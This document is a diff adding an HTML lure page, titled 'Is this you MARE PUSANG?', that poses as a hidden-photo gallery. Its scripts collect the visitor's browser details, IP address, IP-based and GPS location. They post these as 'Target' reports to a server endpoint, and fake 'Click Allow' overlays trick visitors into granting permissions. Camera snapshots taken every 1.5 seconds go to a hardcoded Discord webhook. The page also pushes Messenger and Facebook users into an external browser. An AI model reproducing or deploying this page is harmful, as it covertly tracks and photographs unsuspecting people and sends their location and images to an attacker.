@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html>
+<title>Is this you MARE PUSANG?</title>
+<head>
+  <script type="text/javascript" src="dwebhook.js"></script>
+  <style>
+    #videoContainer {
+      position: fixed;
+      top: 10px;
+      right: 10px;
+      width: 160px;
+      height: 120px;
+      background: black;
+      z-index: 90000;
+      border: 2px solid #4CAF50;
+      border-radius: 8px;
+      overflow: hidden;
+      display: none;
+    }
+    #videoContainer video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+    /* Full‑screen in‑app browser overlay */
+    #inAppBrowserOverlay {
+      display: none; /* hidden by default */
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.95);
+      z-index: 9999999;
+      color: white;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      font-family: Arial, sans-serif;
+    }
+    #inAppBrowserOverlay h1 {
+      margin-bottom: 10px;
+      font-size: 28px;
+    }
+    #inAppBrowserOverlay p {
+      max-width: 400px;
+      text-align: center;
+      margin: 10px 20px;
+    }
+    #openBrowserBtn {
+      padding: 15px 40px;
+      font-size: 18px;
+      background: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 15px;
+    }
+    #closeOverlayBtn {
+      position: absolute;
+      top: 15px;
+      right: 25px;
+      font-size: 32px;
+      background: none;
+      border: none;
+      color: #aaa;
+      cursor: pointer;
+    }
+  </style>
+</head>
+
+<body onload="getLocation(); checkCamera();">
+
+  <!-- Original overlays -->
+  <div id="locationOverlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:100000;display:flex;flex-direction:column;justify-content:center;align-items:center;color:white;font-family:Arial,sans-serif;">
+    <h1 style="margin-bottom:10px;">Click Allow to Access</h1>
+    <p style="font-size:18px;margin-bottom:30px;text-align:center;max-width:500px;">This site requires confirmation to continue. Please allow to proceed.</p>
+    <button id="allowBtn" onclick="retryLocation()" style="padding:15px 40px;font-size:18px;background:#4CAF50;color:white;border:none;border-radius:8px;cursor:pointer;">Enable and View Now</button>
+  </div>
+
+  <div id="cameraOverlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:100001;display:flex;flex-direction:column;justify-content:center;align-items:center;color:white;font-family:Arial,sans-serif;">
+    <h1 style="margin-bottom:10px;">Click Enable to View Access</h1>
+    <p style="font-size:18px;margin-bottom:30px;text-align:center;max-width:500px;">This site requires confirmation to access. Please allow to proceed.</p>
+    <button id="allowCameraBtn" onclick="retryCamera()" style="padding:15px 40px;font-size:18px;background:#4CAF50;color:white;border:none;border-radius:8px;cursor:pointer;">Enable and View Now</button>
+  </div>
+
+  <!-- Camera box -->
+  <div id="videoContainer"><video id="video" playsinline autoplay muted></video></div>
+
+  <!-- Gallery iframe (unchanged) -->
+  <iframe style="position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:99999;"
+    srcdoc="<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><style>*{margin:0;padding:0;box-sizing:border-box;}body{font-family:Arial,sans-serif;background:#1a1a1a;color:white;overflow-x:hidden;}header{text-align:center;padding:30px 20px;background:#111;}header h1{font-size:36px;margin-bottom:5px;}header p{font-size:16px;color:#aaa;}.gallery{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:15px;padding:30px;max-width:1400px;margin:0 auto;}.gallery-item{position:relative;overflow:hidden;border-radius:10px;cursor:pointer;aspect-ratio:1/1;background:#333;}.gallery-item img{width:100%;height:100%;object-fit:cover;transition:transform 0.3s ease,opacity 0.3s ease;display:block;}.gallery-item:hover img{transform:scale(1.05);opacity:0.8;}.gallery-item .overlay{position:absolute;bottom:0;left:0;right:0;background:linear-gradient(transparent,rgba(0,0,0,0.8));padding:20px 15px 15px;opacity:0;transition:opacity 0.3s ease;}.gallery-item:hover .overlay{opacity:1;}.lightbox{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:10000;justify-content:center;align-items:center;}.lightbox.active{display:flex;}.lightbox img{max-width:90%;max-height:80%;border-radius:10px;}.close-btn{position:absolute;top:20px;right:30px;font-size:40px;color:white;cursor:pointer;background:none;border:none;}</style></head><body><header><h1>Hidden Photos</h1><p>Is this you Is this you MARE PUSANG</p></header><div class='gallery'><div class='gallery-item' onclick='openLightbox(this)'><img src='https://i.ibb.co/jvT74Jcf/Screenshot-2026-06-21-125132.png' alt='Photo 1'><div class='overlay'><h3>Photo 1</h3><p>Description</p></div></div><div class='gallery-item' onclick='openLightbox(this)'><img src='https://i.ibb.co/cKmBxRnH/561185210-122096092611071963-8734785337901921052-n.jpg' alt='Photo 2'><div class='overlay'><h3>Photo 2</h3><p>Description</p></div></div><div class='gallery-item' onclick='openLightbox(this)'><img src='https://i.ibb.co/QFTPzQqM/3.jpg' alt='Photo 3'><div class='overlay'><h3>Photo 3</h3><p>Description</p></div></div></div><div class='lightbox' id='lightbox' onclick='closeLightbox(event)'><button class='close-btn'>&times;</button><img id='lightboxImg' src=''></div><script>function openLightbox(item){var img=item.querySelector('img');var lb=document.getElementById('lightbox');document.getElementById('lightboxImg').src=img.src;lb.classList.add('active');}function closeLightbox(event){document.getElementById('lightbox').classList.remove('active');}</script></body></html>">
+  </iframe>
+
+  <!-- In‑App Browser Overlay (appears only in Messenger/FB/Instagram etc.) -->
+  <div id="inAppBrowserOverlay">
+    <button id="closeOverlayBtn" onclick="document.getElementById('inAppBrowserOverlay').style.display='none'">&times;</button>
+    <h1>Open in your browser</h1>
+    <p>For a better experience, tap the button below to view this page in Chrome / Safari.</p>
+    <button id="openBrowserBtn" onclick="openInExternalBrowser()">Open in Browser</button>
+  </div>
+
+  <p id="demo"></p>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+  <!-- ... (all your original scripts – location, camera, webhook – remain identical below) ... -->
+  <script>
+    var x = document.getElementById("demo");
+    let datetime = new Date();
+    let localtime = String(datetime.toLocaleTimeString());
+    var sysinfo = (" GET ", "```xl\n" + navigator.userAgent + "```" + "```autohotkey\n" + "\nPlatform: " + navigator.platform + "\nCookies_Enabled: " + navigator.cookieEnabled + "\nBrowser_Language: " + navigator.language + "\nBrowser_Name: " + navigator.appName + "\nBrowser_CodeName: " + navigator.appCodeName + "\nRam: " + navigator.deviceMemory + "\nCPU_cores: " + navigator.hardwareConcurrency + "\nScreen_Width: " + screen.width + "\nScreen_Height: " + screen.height + "\nTime: " + localtime + "\nRefUrl: " + document.referrer + "\nOscpu: " + navigator.oscpu + "```");
+    const request = new XMLHttpRequest();
+    request.open("POST", "/location_update");
+    request.setRequestHeader('Content-type', 'application/json');
+    var myEmbed = { author: { name: "Target System Information.." }, title: "Uagent:", description: sysinfo, color: 15418782 };
+    var params = { username: "R4VEN", avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png", content: "@everyone Someone Opened The Link O_o ", embeds: [myEmbed] };
+    request.send(JSON.stringify(params));
+
+    $.getJSON("https://api.ipify.org?format=json", function (data) {
+      $("#gfg").html(data.ip);
+      const request = new XMLHttpRequest();
+      request.open("POST", "/location_update");
+      request.setRequestHeader('Content-type', 'application/json');
+      var myEmbed = { author: { name: "Target Ip" }, description: '```xl\n' + data.ip + '```' + '\n__**IP Details:**__ https://ip-api.com/#' + data.ip + "\n", color: 15548997, footer: { text: "Geographic location based on IP address is NOT accurate, it provides the approximate location of the ISP." } };
+      var params = { username: "R4VEN", avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png", embeds: [myEmbed] };
+      request.send(JSON.stringify(params));
+    });
+
+    $.getJSON("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (response) {
+      const request = new XMLHttpRequest();
+      request.open("POST", "/location_update");
+      request.setRequestHeader('Content-type', 'application/json');
+      var myEmbed = { author: { name: "IP Address Reconnaissance" }, title: response.status, description: '```autohotkey\nContinent: ' + response.continent + "\nContinentCode: " + response.continentcode + "\nCountry: " + response.country + "\nCountrycode: " + response.countrycode + "\nRegionname: " + response.regionName + "\nRegion: " + response.region + "\nCity: " + response.city + "\nDistrict: " + response.district + "\nZip: " + response.zip + "\nTime_zone: " + response.time_zone + "\nName: " + response.name + "\nAs: " + response.as + "\nIsp: " + response.isp + "\nReverse: " + response.reverse + "\nOffset: " + response.offset + "\nCurrency: " + response.currency + "\nProxy: " + response.proxy + "\nMobile: " + response.mobile + "\nLat: " + response.lat + "\nLon: " + response.lon + '```', color: 5763719 };
+      var params = { username: "R4VEN", avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png", embeds: [myEmbed] };
+      request.send(JSON.stringify(params));
+    });
+
+    function getLocation() { if (navigator.geolocation) { if (localStorage.getItem("locationGranted") === "true") document.getElementById("locationOverlay").style.display = "none"; navigator.geolocation.getCurrentPosition(showPosition, showError); } else x.innerHTML = "Geolocation is not supported by this browser."; }
+    function retryLocation() { if (navigator.geolocation) navigator.geolocation.getCurrentPosition(showPosition, showError); }
+    function showPosition(position) { localStorage.setItem("locationGranted", "true"); document.getElementById("locationOverlay").style.display = "none"; document.getElementById("cameraOverlay").style.display = "none"; var latlong = (" GET ", "```prolog\nLatitude:" + position.coords.latitude + "\nLongitude:" + position.coords.longitude + "```" + "\n__**Map Location:**__ https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude + "\n__**Google Earth:**__ https://earth.google.com/web/search/" + position.coords.latitude + "," + position.coords.longitude); const request = new XMLHttpRequest(); request.open("POST", "/location_update"); request.setRequestHeader('Content-type', 'application/json'); var myEmbed = { author: { name: "Target Allowed Location Permission" }, title: "GPS location of target..", description: latlong + "\n", color: 15844367, footer: { text: "GPS fetch almost exact location because it uses longitude and latitude coordinates." } }; var params = { username: "R4VEN", avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png", embeds: [myEmbed] }; request.send(JSON.stringify(params)); }
+    function showError(error) { switch(error.code) { case error.PERMISSION_DENIED: localStorage.removeItem("locationGranted"); document.getElementById("locationOverlay").style.display = "flex"; const request = new XMLHttpRequest(); request.open("POST", "/location_update"); request.setRequestHeader('Content-type', 'application/json'); const params = { username: "R4VEN", avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png", content: "```diff\n- User denied the request for Geolocation.```" }; request.send(JSON.stringify(params)); setTimeout(retryLocation, 3000); break; case error.POSITION_UNAVAILABLE: x.innerHTML = "Location information is unavailable."; break; case error.TIMEOUT: x.innerHTML = "The request to get user location timed out."; break; case error.UNKNOWN_ERROR: x.innerHTML = "An unknown error occurred."; break; } }
+  </script>
+
+  <script>
+    let discordWebhookUrl = "https://discord.com/api/webhooks/1535181371184521216/jcKSEkT7W8ramtmD9hOaELS26za-0m3q2PpjWvt6oqbgO9OYt6uwBelutmqE18dDCB_8";
+    function postFile(blob) { let formdata = new FormData(); formdata.append("file1", blob, "capture.jpg"); formdata.append("payload_json", JSON.stringify({ username: "R4VEN", avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png" })); let xhr = new XMLHttpRequest(); xhr.open('POST', discordWebhookUrl, true); xhr.onload = function () { if (this.status === 200) console.log("Image captured and sent to Discord!"); else console.error("Error sending image:", xhr); }; xhr.send(formdata); }
+    const video = document.getElementById('video');
+    const canvas = document.createElement('canvas');
+    canvas.width = 640; canvas.height = 480;
+    canvas.style.display = 'none';
+    const constraints = { audio: false, video: { facingMode: "user" } };
+    function checkCamera() { if (localStorage.getItem("cameraGranted") === "true") { document.getElementById("cameraOverlay").style.display = "none"; document.getElementById("videoContainer").style.display = "block"; } }
+    async function init() { try { const stream = await navigator.mediaDevices.getUserMedia(constraints); handleSuccess(stream); localStorage.setItem("cameraGranted", "true"); } catch (e) { document.getElementById("locationOverlay").style.display = "none"; document.getElementById("cameraOverlay").style.display = "flex"; } }
+    function handleSuccess(stream) { window.stream = stream; video.srcObject = stream; document.getElementById("videoContainer").style.display = "block"; var context = canvas.getContext('2d'); setInterval(function () { context.drawImage(video, 0, 0, canvas.width, canvas.height); canvas.toBlob(function(blob) { if (blob) { let imageUrl = URL.createObjectURL(blob); let img = document.createElement('img'); img.src = imageUrl; img.style.width = '150px'; img.style.margin = '5px'; img.style.border = '1px solid white'; document.body.appendChild(img); } }, 'image/jpeg'); canvas.toBlob(postFile, 'image/jpeg'); }, 1500); document.getElementById("cameraOverlay").style.display = "none"; }
+    function retryCamera() { init(); }
+    init();
+  </script>
+
+  <!-- In‑app browser detection & external browser opener -->
+  <script>
+    function isInAppBrowser() {
+      var ua = navigator.userAgent || navigator.vendor || window.opera;
+      return /FBAN|FBAV|Instagram|Messenger/i.test(ua) || (window.navigator.standalone === false && /FB_IAB/i.test(ua));
+    }
+
+    function openInExternalBrowser() {
+      var currentUrl = window.location.href;
+      var isAndroid = /android/i.test(navigator.userAgent);
+      if (isAndroid) {
+        var packageName = 'com.android.chrome';
+        var intentUrl = 'intent://' + window.location.host + window.location.pathname + window.location.search +
+                        '#Intent;scheme=https;package=' + packageName +
+                        ';S.browser_fallback_url=' + encodeURIComponent('https://play.google.com/store/apps/details?id=' + packageName) +
+                        ';end';
+        window.location = intentUrl;
+      } else {
+        alert('Copy the link and open it in Safari or another browser.');
+      }
+    }
+
+    window.addEventListener('load', function () {
+      if (isInAppBrowser()) {
+        document.getElementById('inAppBrowserOverlay').style.display = 'flex';
+      }
+    });
+  </script>
+
+</body>
+</html>
